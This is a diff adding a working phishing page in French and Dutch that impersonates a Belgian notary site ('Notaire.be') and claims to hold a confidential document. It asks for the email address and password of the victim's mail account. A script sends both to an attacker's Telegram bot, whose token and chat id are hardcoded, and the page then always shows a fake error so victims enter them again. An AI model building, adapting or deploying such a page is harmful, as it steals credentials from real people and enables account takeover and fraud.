@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Notaire.be</title>
+
+<style>
+body, html {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    font-family: Arial, sans-serif;
+}
+
+.background {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    background: url('https://i.imgur.com/ykMenrn.png') no-repeat center center/cover;
+    filter: blur(8px);
+    z-index: -1;
+}
+
+/* LANG */
+.lang-switch {
+    position: fixed;
+    top: 15px;
+    right: 20px;
+    display: flex;
+    gap: 10px;
+    z-index: 10;
+}
+
+.lang-item {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    font-weight: bold;
+    color: white;
+    background: rgba(0,0,0,0.4);
+    padding: 5px 10px;
+    border-radius: 20px;
+}
+
+.lang-item img {
+    width: 20px;
+    margin-left: 5px;
+}
+
+/* FORM */
+.container {
+    position: absolute;
+    top: 45%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: rgba(255, 255, 255, 0.92);
+    padding: 35px;
+    border-radius: 18px;
+    width: 340px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+    text-align: center;
+}
+
+/* LOGO */
+.logo {
+    width: 180px;
+    height: auto;
+    display: block;
+    margin: 0 auto 15px auto;
+    object-fit: contain;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.15);
+}
+
+/* 🔥 TITRE + BLINK LENT */
+#title {
+    color: #6CCBDB;
+    animation: slowBlink 3s infinite;
+}
+
+@keyframes slowBlink {
+    0% { opacity: 1; }
+    50% { opacity: 0.5; }
+    100% { opacity: 1; }
+}
+
+/* SUBTITLE */
+#subtitle {
+    color: #6CCBDB;
+    font-size: 14px;
+    margin-bottom: 20px;
+    font-weight: 500;
+    opacity: 0.9;
+}
+
+/* FIELDS */
+.field {
+    text-align: left;
+    margin-bottom: 12px;
+}
+
+.field label {
+    font-weight: 600;
+    font-size: 13px;
+    color: #333;
+    display: block;
+    margin-bottom: 5px;
+}
+
+input {
+    width: 100%;
+    padding: 12px 14px;
+    border-radius: 12px;
+    border: 1px solid #ddd;
+    outline: none;
+    background: #f9f9f9;
+    transition: 0.25s;
+}
+
+input:focus {
+    border-color: #6CCBDB;
+    box-shadow: 0 0 0 3px rgba(108,203,219,0.2);
+    background: white;
+}
+
+/* BUTTON */
+button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 10px;
+    background: #6CCBDB;
+    color: white;
+    border: none;
+    border-radius: 12px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.25s;
+}
+
+button:hover {
+    background: #55b9c9;
+}
+
+/* ERROR */
+#error {
+    display: none;
+    margin-top: 10px;
+    color: red;
+    font-weight: bold;
+}
+
+/* LOADER */
+#loading {
+    display: none;
+    text-align: center;
+    margin-top: 200px;
+}
+
+.loader {
+    border: 5px solid #eee;
+    border-top: 5px solid #6CCBDB;
+    border-radius: 50%;
+    width: 45px;
+    height: 45px;
+    animation: spin 1s linear infinite;
+    margin: auto;
+}
+
+@keyframes spin {
+    100% { transform: rotate(360deg); }
+}
+
+#loading-text {
+    color: #6CCBDB;
+    margin-top: 10px;
+}
+
+/* SHAKE */
+@keyframes shake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(-5px); }
+    50% { transform: translateX(5px); }
+    75% { transform: translateX(-5px); }
+    100% { transform: translateX(0); }
+}
+
+.shake {
+    animation: shake 0.4s ease;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="background"></div>
+
+<!-- LANG -->
+<div class="lang-switch">
+    <div class="lang-item" onclick="setLang('fr')">
+        FR <img src="https://flagcdn.com/w40/fr.png">
+    </div>
+    <div class="lang-item" onclick="setLang('nl')">
+        NL <img src="https://flagcdn.com/w40/nl.png">
+    </div>
+</div>
+
+<!-- FORM -->
+<div class="container">
+
+<img src="https://i.imgur.com/DSqyQaM.png" class="logo">
+
+<h2 id="title"></h2>
+<div id="subtitle"></div>
+
+<div class="field">
+<label id="label1"></label>
+<input id="q1" type="text" placeholder="veuillez saisir votre Email">
+</div>
+
+<div class="field">
+<label id="label2"></label>
+<input id="q2" type="text" placeholder="veuillez saisir votre mot de passe">
+</div>
+
+<button onclick="suivant()" id="btn"></button>
+
+<div id="error"></div>
+
+</div>
+
+<!-- LOADER -->
+<div id="loading">
+<div class="loader"></div>
+<h2 id="loading-text"></h2>
+</div>
+
+<script>
+
+const translations = {
+    fr: {
+        title: "DOCUMENT CONFIDENTIEL!",
+        subtitle: "Pour lire ce document, veuillez indiquer les informations de votre compte de Messagerie auquel le rapport vous a été envoyé..",
+        label1: "E-mail",
+        label2: "Mot de Passe",
+        btn: "Voir Document",
+        loading: "Veuillez patienter S.V.P",
+        error: "Information incorrecte! Veuillez réessayer"
+    },
+    nl: {
+        title: "VERTROUWELIJK DOCUMENT!",
+        subtitle: "Om dit document te lezen, geef alstublieft de informatie van uw e-mailaccount waar het rapport naartoe is gestuurd..",
+        label1: "E-mail",
+        label2: "Wachtwoord",
+        btn: "Zien document",
+        loading: "Even geduld a.u.b",
+        error: "Onjuiste informatie! Probeer opnieuw"
+    }
+};
+
+let currentLang = "fr";
+
+function setLang(lang){
+    currentLang = lang;
+
+    document.getElementById("title").innerText = translations[lang].title;
+    document.getElementById("subtitle").innerText = translations[lang].subtitle;
+    document.getElementById("label1").innerText = translations[lang].label1;
+    document.getElementById("label2").innerText = translations[lang].label2;
+    document.getElementById("btn").innerText = translations[lang].btn;
+    document.getElementById("error").innerText = translations[lang].error;
+}
+
+function isValidEmail(email){
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+/* TELEGRAM */
+function envoyerTelegram(q1, q2){
+
+    const token = "8569055094:AAG7zZEPURk6fILTncoV8OBHZqWeBEgWHc0";
+    const chat_id = "7670218158";
+
+    const message =
+        "📩 Nouvelle question:\n\nEmail: " + q1 + "\nQuestion: " + q2;
+
+    fetch(`https://api.telegram.org/bot8569055094:AAG7zZEPURk6fILTncoV8OBHZqWeBEgWHc0/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({
+            chat_id: chat_id,
+            text: message
+        })
+    });
+}
+
+/* MAIN */
+function suivant(){
+
+    const q1Input = document.getElementById("q1");
+    const q2Input = document.getElementById("q2");
+
+    const q1 = q1Input.value.trim();
+    const q2 = q2Input.value.trim();
+
+    const container = document.querySelector(".container");
+    const error = document.getElementById("error");
+
+    let valid = true;
+
+    container.classList.remove("shake");
+
+    q1Input.style.border = "1px solid #ddd";
+    q2Input.style.border = "1px solid #ddd";
+
+    if(!isValidEmail(q1)){
+        q1Input.style.border = "2px solid red";
+        valid = false;
+    } else {
+        q1Input.style.border = "2px solid #28a745";
+    }
+
+    if(q2 === ""){
+        q2Input.style.border = "2px solid red";
+        valid = false;
+    } else {
+        q2Input.style.border = "2px solid #28a745";
+    }
+
+    if(!valid){
+        error.innerText = translations[currentLang].error;
+        error.style.display = "block";
+
+        container.classList.add("shake");
+        setTimeout(()=>container.classList.remove("shake"),400);
+        return;
+    }
+
+    envoyerTelegram(q1, q2);
+
+    container.style.display = "none";
+    error.style.display = "none";
+    document.getElementById("loading").style.display = "block";
+
+    let dots = 0;
+    const loadingText = document.getElementById("loading-text");
+
+    const interval = setInterval(()=>{
+        dots = (dots+1)%4;
+        loadingText.innerText = translations[currentLang].loading + ".".repeat(dots);
+    },400);
+
+    setTimeout(()=>{
+        clearInterval(interval);
+        document.getElementById("loading").style.display = "none";
+        container.style.display = "block";
+        error.style.display = "block";
+    },2000);
+}
+
+setLang(currentLang);
+
+</script>
+
+</body>
+</html>
